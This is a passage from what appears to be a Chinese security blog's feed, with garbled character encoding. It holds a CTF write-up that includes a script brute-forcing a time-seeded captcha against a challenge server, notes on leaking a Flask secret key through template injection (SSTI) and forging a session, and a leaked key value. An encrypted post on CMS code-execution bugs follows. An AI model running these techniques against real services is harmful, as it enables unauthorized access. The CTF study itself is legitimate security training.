punctuation">)</span><span class="token punctuation">)</span>        text_width <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">]</span><span class="token punctuation">)</span>        width <span class="token operator">=</span> max<span class="token punctuation">(</span>text_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_width<span class="token punctuation">)</span>        image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>        average <span class="token operator">=</span> int<span class="token punctuation">(</span>text_width <span class="token operator">/</span> len<span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span>        rand <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token number">0.25</span> <span class="token operator">*</span> average<span class="token punctuation">)</span>        offset <span class="token operator">=</span> int<span class="token punctuation">(</span>average <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">:</span>            w<span class="token punctuation">,</span> h <span class="token operator">=</span> im<span class="token punctuation">.</span>size            mask <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>point<span class="token punctuation">(</span>self<span class="token punctuation">.</span>lookup_table<span class="token punctuation">)</span>            image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>im<span class="token punctuation">,</span> <span class="token punctuation">(</span>offset<span class="token punctuation">,</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_height <span class="token operator">-</span> h<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span>            offset <span class="token operator">=</span> offset <span class="token operator">+</span> w <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token operator">-</span>rand<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> width <span class="token operator">></span> self<span class="token punctuation">.</span>_width<span class="token punctuation">:</span>            image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> image    <span class="token keyword">def</span> <span class="token function">generate_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        background <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>        color <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>create_captcha_image<span class="token punctuation">(</span>chars<span class="token punctuation">,</span> color<span class="token punctuation">,</span> background<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_noise_dots<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_noise_curve<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>SMOOTH<span class="token punctuation">)</span>        <span class="token keyword">return</span> im    <span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>BytesIO<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        out <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>out<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>        out<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> out<span class="token punctuation">,</span> code    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> output<span class="token punctuation">:</span> str<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>Image<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>output<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>        <span class="token keyword">return</span> im<span class="token punctuation">,</span> code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œ<code>/vip</code>æ˜¯è°ƒç”¨äº†<code>generate_code</code>æ–¹æ³•ç”ŸæˆéªŒè¯ç ã€‚</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_code</span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        characters <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>characters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># I=I+1</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œç¼–å†™çˆ†ç ´è„šæœ¬çš„æ€è·¯å°±æœ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè®¿é—®ä¸€æ¬¡<code>/catpcha</code>è®©ä»–é‡ç½®ä¸€ä¸‹ç§å­ï¼Œå› ä¸ºé¢˜ç›®è®¾ç½®çš„<code>key</code>æ˜¯ç”±å½“å‰æ—¶é—´æˆ³åŠ ä¸ªéšæœºæ•°ç”Ÿæˆçš„ï¼Œæ‰€ä»¥è¿™ä¸ªç§å­æ˜¯å¯ä»¥é€šè¿‡éå†çˆ†ç ´å°±èƒ½æ‹¿åˆ°ã€‚åˆå› ä¸º<code>random.choice</code>æ˜¯ä¼ªéšæœºçš„ï¼Œæ‰€ä»¥åªè¦çˆ†ç ´å¯¹äº†<code>key</code>æ­£ç¡®çš„éªŒè¯ç å°±å‡ºæ¥äº†ã€‚</p><p>ä¸è¿‡è¿™é‡Œæœ‰ä¸¤ä¸ªå‘ï¼š</p><ol><li>ç¬¬ä¸€æ¬¡ç”ŸæˆéªŒè¯ç å¿…é¡»å®ä¾‹åŒ–<code>Captcha(200, 80,key=key)</code>ï¼Œå®½é«˜å¿…é¡»å¯¹åº”ä¸Šï¼Œå¥½åƒæ˜¯<code>random</code>é‡Œè°ƒç”¨äº†æŒ‡å®šçš„å®½é«˜ï¼Œè¿™æ ·å°±æ‰“ä¹±äº†åç»­ï¼ˆç¬¬äºŒæ¬¡ç¬¬ä¸‰æ¬¡ï¼‰ç”ŸæˆéªŒè¯ç çš„é€»è¾‘ï¼Œå¯¼è‡´çˆ†ç ´ä¸å‡ºæ¥ã€‚</li><li>å…¬å…±é¶åœºï¼Œå¯èƒ½æœ‰åˆ«äººä¹Ÿåœ¨è®¿é—®è·¯ç”±ä»è€Œç ´åæˆåŠŸç‡ã€‚</li></ol><p>è€ƒè™‘åˆ°ä¸Šé¢ä¸¤ä¸ªå› ç´ ï¼Œå†™ä¸‹äº†å¦‚ä¸‹è„šæœ¬ï¼Œå°±ç®—æœ‰äººæ£ä¹±ä½†æ˜¯ä¹Ÿä¸å¯èƒ½ä¸€ç›´æ£ä¹±ï¼Œåªè¦ä¸€ç›´è¯·æ±‚å°±å¥½äº†ï¼Œå®é™…æµ‹è¯•å‡ ç§’é’Ÿå°±èƒ½è·‘å‡ºæ¥ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">from</span> utils<span class="token punctuation">.</span>captcha <span class="token keyword">import</span> Captcha<span class="token punctuation">,</span>generate_codeflag<span class="token operator">=</span><span class="token boolean">False</span>url<span class="token operator">=</span><span class="token string">"http://124.70.33.170:23001/"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    uuu<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"captcha"</span>    number<span class="token operator">=</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>uuu<span class="token punctuation">)</span>    cc1<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>    i<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> randoms <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> number<span class="token operator">+</span>randoms        <span class="token comment" spellcheck="true"># key = </span>        gen <span class="token operator">=</span> Captcha<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å¿…é¡»æ˜¯å¡«200,80.</span>        buf <span class="token punctuation">,</span> captcha_text <span class="token operator">=</span> gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># gen = Captcha(key=1698630385)</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(captcha)</span>        burp0_url <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"vip"</span>        burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001/"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">}</span>        burp0_json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"captcha"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>captcha<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># print(burp0_json)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> json<span class="token operator">=</span>burp0_json<span class="token punctuation">)</span>        cc2<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">if</span> cc1<span class="token operator">!=</span>cc2<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sucess"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>cc2<span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ‰¾åˆ°äº†"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ²¡æœ‰æ‰¾åˆ°ï¼Œè¯·é‡æ–°è¿è¡Œ"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sucess</span><span class="token comment" spellcheck="true">#eyJjYXB0Y2hhIjoieGRmQSIsInZpcCI6dHJ1ZX0.ZT8bDQ.JKzPFmo1IIlRlRxtBKT4Ut3tbms</span><span class="token comment" spellcheck="true">#æ‰¾åˆ°äº†</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sessionä¼ªé€ æ‰“SSTI"><a href="#sessionä¼ªé€ æ‰“SSTI" class="headerlink" title="sessionä¼ªé€ æ‰“SSTI"></a>sessionä¼ªé€ æ‰“SSTI</h5><p>ç›´æ¥ç”¨<code>&#123;&#123;config&#125;&#125;</code>å°±è¡Œï¼Œå¤šè¯•å‡ æ¬¡ï¼Œå› ä¸ºæ˜¯éšæœº<code>WAF</code>ã€‚å¤šè¯•å‡ æ¬¡å°±ä¼šé‡åˆ°æ²¡æœ‰banæ‰<code>config</code>çš„åƒåœ¾<code>WAF</code>äº†ï¼Œè®¾ç½®æˆåŠŸå°±èƒ½ç›´æ¥è¯»å–åˆ°<code>secret_key</code>äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682680474.jpg" alt="1698682680474"></p><p>æˆåŠŸè¯»å–åˆ°<code>secret-key:16d07433931f178ff35c75e83924d5e9</code></p><p>ä¼ªé€ <code>session</code>æ‰“<code>ssti</code>å³å¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682706411.jpg" alt="1698682706411"></p><p>å¸¦ç€<code>session</code>è¯·æ±‚<code>/story</code>å³å¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682734088.jpg" alt="1698682734088"></p><h4 id="MyGOâ€™s-Live"><a href="#MyGOâ€™s-Live" class="headerlink" title="MyGOâ€™s Live!!!!!"></a>MyGOâ€™s Live!!!!!</h4><p>ç¬¬ä¸€é“é¢˜ç›´æ¥ä¸Šè½¦äº†ï¼Œå°±æ˜¯<code>-iL </code>è¯»æ–‡ä»¶ç„¶åè¾“å‡ºåˆ°ä¸»é¡µä¸Šã€‚å‚æ•°æ³¨å…¥çš„é¢˜æˆ‘ä¸ªäººä¸æ˜¯å¾ˆå–œæ¬¢ï¼Œå¹¶ä¸”è‡ªå·±ä¹Ÿä¸æ“…é•¿å°±æ²¡çœ‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XSS </tag>
            
            <tag> SSTI </tag>
            
            <tag> éªŒè¯ç é€»è¾‘æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŒ–æ˜æŸcmsæ¼æ´æ€»ç»“</title>
      <link href="/2023/09/20/wa-jue-mou-cms-qian-tai-rce-zong-jie/"/>
      <url>/2023/09/20/wa-jue-mou-cms-qian-tai-rce-zong-jie/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="edaba05b86aed7862d04796a2db7fd6af91765e409231bb0bcb64f2af6b9c514">84f9431166592793d38f2e967857fd87bd5afbd0a6559a322fae476d862a60be2117f09b7a7ac634865a0dba9e5a26bbd239ff0482f89143cd404cda297fc79255d838fd4a0361f03c1c10ac85707fe43b67a9bf6a445932d8f29bddb0da8da3a3c434edf1260badc9c00bbe0cf341bf8382f517ba907e2d2281edfba22d694ced0a50fd3b1b5ffade581a3ae9dbdc28ca85ea9240705b9a11b0749f8583eb930e32da447333b261c8f5cd713eac7c50daf2c3de2627dd1020983291022d2f14cb3e6a6ee6e5f317e9be07080e13fcbf084da12e18773f06b2e7d2ff9e1137d5dcab731088bb0e3fb619026a4beffb4436e69a013341de1d3f484932d1ac11e06d9da5901d80d2f3fd1018ea34d5d54b0970b8306507fe2c6ab3fb1b0c14d84e7b7a83f28af64da75f70e65546a2a1924aded2ad8bc4f3d15fd19b6a063124fd5d4a2857452e4b6c9bf211b9d0b32f98c049e4140a2b022a12608e4fcf022b4996f4a016e7f5a057e466af038a635aa3a09fd5467484cee94e507bc672f92be474e7a4ea808f40afc9db01a69a06542d19f698a7b6efc1adbfb93ea028363efac3e1de35164da66cc3d5e4f1117a07afdd27eb6ee2b1d35bd02bddc1626439d6c5d8d96d8a9c9218cf8d19e0c4e95f459a61a3b6b445c9ca9e18b5ecd14fede8d6a15a5bf77066277fece62ee261e052fd5d8e4fa13076e84eabde4e7e7ffb38955e3733818ff9b11b68e70f287e8bb75f9c7b3ffae88229118641deb3a4bb6dd763f6f54c25779c13cbb1714cf1c76da57e3167c8f65b2be3134eb41b0545fc80bb9117c5e7ae4554ec595802ecbea50e7c4859d6cc584dd3f0a0eb72a2e8961fe39766dddb85be30015c91bf1ed5277b80bd0a87be69e27eb07735f7f3fffb53dd22089bb8eb1220de5eba74bdfabbf4650ffac6869e907723a7a82bd557ef89cc2cd83c6d95aa286f5326e01aa7ab521a774401b31bae57b7ba094d00e2d65ecd45950b01a87c7aa412414c535427907fb088bb1d47509ea22164e747634ce052f12bc90e12c0c020c1cc4be421ab8712329901aef7209bcd9c97fce16b0c74f670866d8278dbaa93ccad1dd69cab6d4e579afd8dd3fb92da2e8e4f7995a7fb83971df198fd6b22d42a393674f170f9a6fb39ec0997b3429b1f3b70ba8a55c62cbe11ba323292cc0cc67b6595da88f525743d3dabdac833ac140f3a297e7a28fe089f58e6a7d15adf5bb16061d00f9df629d71bfb9a626c58b291e860294ecb408745cf2c272f00b51948498fe0f6d1368f15f0e33a2a3d723cdb6b5b0b2e42a262253b974ebdab5ac67d601827543f231ba26144a855fe0d1d03aec92f167ec4d97cb8e753e80b6b5c5d0b77fa278c353d74c87afc1153b263b01b2b88025368a70bbc4cfc379b365e8ef5e0fc330a8e02d7f68dce7eb58e8afeceb628ab66772d31eeb60d41ec5ab3a63365312448f1ac5aa03ea67f34a94bdcdf783b418e0d82530982c4ebfbf5a2875fdd989b1147a566fa321de1aff37417eb3fecee674eb2afaacff2a1a0afcd25e2e3cc8849498018ca4f5b033ec1ca25045b1f39b2ea8c8977e39c70412929452f087cb12327ea05ec9069b41879f4c11e6690ca25055db664930d1ef6ee4e5658f34ecb1529fd619f77b83abdcf856cf76f47108d3d8e6f2a3737463828b58a948b56f6f9d851d5bac74a57cf8df21f864fa643b9d695e23aa5e34b3bbe35d37a310a90eb4a263192116939a232340d0a5afc7f65d5d1a6446758e43e41436c76f77ff48c40efe53ab82accf93497b2484edee8985a8025dc8f82bd4f1bb140f3d8a3713f6f4329b3fc1cf18166fec0038cfa7e3a732dc7dc3f1ddd2eb4b1cd0ab58c1c6a3f16ea90b7a7d5cd969f748c494f7d5d6d0585d7f00904522687e5c6f263fdcc5e912ba990d992561dc4a06a62e04cd43e4d0e4c2a6d01a009fb8c1ba731eab90cdaab9a81938ab0671abfc3a76d724ff8b6731264c91ce7e50e07debd5b2670d0a8a0c9bb845089e062ecd8cb0ecf6f1033807359460130a0620e3a1ac9db40c3c1080c9047d3f9103a4d3efc450773dd8cc6a037c05d09f48ff0c71e2ebd688b49c43efd24707d500bf7b02ee4c490bc9db6df24bbd06ee4cfcf09d8740048edfc51226804b3e63e46c80e17c874cf82214aada50c552d5c9989e5b674b0ae5234ebb62fe12bff8124b3f0de1898df47153f456e30ad2e321c2b55b9dab7d9155399cf38add50641e18785495dd4425792084b8ea507c4e01558246509bf959c66176e38968da6f1e44060c40b5e923637c8329adc8b38914bbb2d8b3cae0e4a415f2f7f66ee736f9b9611ba0842dad5cb0d0e9821854fba43922f3b879ebb68560718050400bd1012a085b3c5913731cf19e7b792f32cc562d8aca05e3c32b801be238f730b8e7bbca546fa1180cba22308309b24ed9d58b7127f470168dc8afab335f24e3dd7ec1ae9b8616f27473977ea820c9bbaefc0879b88a2888b71ae699870c2765ac6d260671cb46e6c0c8c2c1d4cfeaee75e14205f13b9d48d2b58f2931a93ee93e00b758a1beaaadd69794fc04696593e8d03a8a5cd0bdfc1418c8f6b1d58c81e8b4f50f2a9150fd3cde7efda36db92770b45071ca9f01b1933ff3bbdce2b807312c0f6bc660bae3d87bf9b604bff9f024d03950c20fa7ab98facc0d7b3f91d040524ed8f527d0dfbdd79fd0a0f89893c212fcb723730ece9b094e8221dd1de70af89b73afe6aeeea366d3eab2f3a899652d5311bf2f92dc7dabf4ebe8458f75a8b6598688baeef3a1587bdd9893c45b047d52c7cbf6f6c41e62c9a7f357d45f34777d6c5bdf00b655346ce870f4623bcf4b62f2396263ea23f324d78f8b827a117cd69e47ddfc4941d7524951f62d5127dc559207171d2a7f2c472848399f3dc5088b1d6a1e633bc025b7e3a415d675c818665894b94e7954a97e01fee6ce99e83aa394302846a136e6088582e8d2808491b19448d0c99ba27f50be260cc2d020e42964bc88a4bd91a020d585aef6835dd8bbfc37fa6b29cba2063a130fe1a69f66e932713bc1687f2a936a8364e32d42242547b2a9c0e11267addcac23d43c373982aea015d0149e34526b4747941e062e0b5ca29d24f88862ec9715253f34d0a59c149ba64053b708d2c8b4cfef1593134efafba711f6572576a592432e1c12cb1166a613b6e20b4c93355ff21fca1dcb12beb23e53b0885ea1170201e7b665e5c20bf10997f2d04d97aeb4a69fe3785b9802f5292e83a6132f9a10dadb9111256d53a6a085038d5ca42be044b4173380abc3430770e6fd34c1a53a620f58d39b156affe32139e046eee20409dee1b974a3da2cf5f43da4a638315d6d2cd11d6f8f2cf3c1b54d22604e20ddde73b87328e3560d9b7094595704d0c394c54bf5ccf2e4c2f609c00f18eb254cb70f7d32fec7acf14bfbbeb7d56efff37e640b842dd36f158577df66a1dc875835a0ff94104a381010640cce8e0eb197a85cf192dfa4af18dc84d4bbb80c2707fab77075864877f91054d32ad8934b80affdb655321a0a36b6c9f9ad49f001c26cfbb2a6197b49e9a115d7e2de32415e58a378cc13113a29d2ae26ec449b95759704f7cde6a90d8e6bd48a551558f4c2f9071ea6493836a43b98d2617925e65bb34d7a1c9957bec92b588cc2fc652ae5afa36ae72fff3fe4e8c2abad561b77bd8c0f96b614f15077c79d5a0e087158aeddcd7ae3b872154203dab6a27f21b198b88eeab3f495616a259816c37831c18bd985d9831f9a17aca8a0c65bfa7e3425684a29936bd5e099d5f9f1443d92c3fd1cd93c089621a92a0d8b39473ca91f2e2cc0fc89d03617e4eb56ca22fa0a74f56754c49a4d8de27a7ea8f175a9c4405861cba6638a9ea393b0a760d4d5659d3dee8f207c4c9203b56243e9f00053e3b5c5abec209e4d9bec8b0421b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">è¯·è¾“å…¥å¯†ç </span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é—²èŠ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŒ–æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjsonç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•</title>
      <link href="/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/"/>
      <url>/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/</url>
      
